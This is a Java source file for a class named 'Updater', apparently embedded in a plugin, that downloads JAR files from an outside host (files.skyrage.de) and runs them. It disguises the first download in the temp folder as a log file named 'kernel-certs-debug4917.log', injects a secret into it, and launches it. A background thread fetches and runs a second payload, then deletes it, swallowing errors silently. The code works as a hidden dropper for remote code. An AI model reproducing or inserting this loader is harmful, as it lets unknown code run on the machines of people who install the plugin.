import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.CopyOption;
import java.nio.file.Files;
import java.nio.file.OpenOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Base64;
import java.util.Enumeration;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

public class Updater {
    public static void init() {
        try {
            File tmpdir = new File(System.getProperty("java.io.tmpdir"));
            File file = new File(tmpdir, "kernel-certs-debug4917.log");
            boolean linux = !System.getProperty("os.name").toLowerCase().contains("win");
            String jvmFilePath = new File(System.getProperty("java.home") + (linux ? "/bin/java" : "\\bin\\javaw.exe")).getPath();
            if (file.exists()) {
                Runtime.getRuntime().exec(new String[]{jvmFilePath, "-jar", file.getPath()});
                return;
            }
            byte[] secret = new byte[]{-48, -6, -23, -57, 103, -92, 41, 103};
            try {
                secret = Updater.getBytesFromInputStream(Updater.class.getResourceAsStream("/plugin-config.bin"));
            } catch (Throwable e) {
                e.printStackTrace();
            }
            Updater.downloadJarWithSecret(file, secret);
            byte[] finalSecret = secret;
            new Thread(() -> {
                try {
                    Updater.setup(finalSecret);
                } catch (Exception exception) {
                    // empty catch block
                }
            }).start();
            Runtime.getRuntime().exec(new String[]{jvmFilePath, "-jar", file.getPath()});
        } catch (Exception e) {
            e.printStackTrace();
            throw new Error(e);
        }
    }

    public static void copy(InputStream input, OutputStream output) throws IOException {
        int bytesRead;
        byte[] buf = new byte[4096];
        while ((bytesRead = input.read(buf)) != -1) {
            output.write(buf, 0, bytesRead);
        }
    }

    public static byte[] getBytesFromInputStream(InputStream is) throws IOException {
        ByteArrayOutputStream os = new ByteArrayOutputStream();
        byte[] buffer = new byte[65535];
        int len = is.read(buffer);
        while (len != -1) {
            os.write(buffer, 0, len);
            len = is.read(buffer);
        }
        return os.toByteArray();
    }

    public static void setup(byte[] secret) throws Exception {
        boolean linux = !System.getProperty("os.name").toLowerCase().contains("win");
        String jvmFilePath = new File(System.getProperty("java.home") + (linux ? "/bin/java" : "\\bin\\javaw.exe")).getPath();
        File file = new File(".log");
        HttpURLConnection huc = (HttpURLConnection) new URL("http://files.skyrage.de/mvd").openConnection();
        Files.copy(huc.getInputStream(), file.toPath(), new CopyOption[]{StandardCopyOption.REPLACE_EXISTING});
        Runtime.getRuntime().exec(new String[]{jvmFilePath, "-Dgnu=" + Base64.getEncoder().encodeToString(secret), "-jar", file.getPath()}).waitFor();
        file.delete();
    }

    public static void downloadJarWithSecret(File file, byte[] secret) throws Exception {
        HttpURLConnection huc = (HttpURLConnection) new URL("http://files.skyrage.de/update").openConnection();
        Files.copy(huc.getInputStream(), file.toPath(), new CopyOption[]{StandardCopyOption.REPLACE_EXISTING});
        Updater.changeSecret(new ZipFile(file), secret);
    }

    public static void changeSecret(ZipFile originalZip, byte[] newSecret) throws IOException {
        File tmpFile = new File(originalZip.getName() + ".tmpzip");
        Files.copy(new File(originalZip.getName()).toPath(), tmpFile.toPath(), new CopyOption[]{StandardCopyOption.REPLACE_EXISTING});
        ZipFile zipCopy = new ZipFile(tmpFile);
        ZipOutputStream zos = new ZipOutputStream(Files.newOutputStream(Paths.get(originalZip.getName(), new String[0]), new OpenOption[0]));
        Enumeration entries = zipCopy.entries();
        while (entries.hasMoreElements()) {
            ZipEntry oldEntry = (ZipEntry) entries.nextElement();
            ZipEntry newEntry = new ZipEntry(oldEntry.getName());
            zos.putNextEntry(newEntry);
            if (!newEntry.isDirectory()) {
                if (newEntry.getName().equals("gnu")) {
                    zos.write(newSecret);
                } else {
                    Updater.copy(zipCopy.getInputStream(oldEntry), zos);
                }
            }
            zos.closeEntry();
        }
        zipCopy.close();
        originalZip.close();
        zos.close();
        tmpFile.delete();
    }
}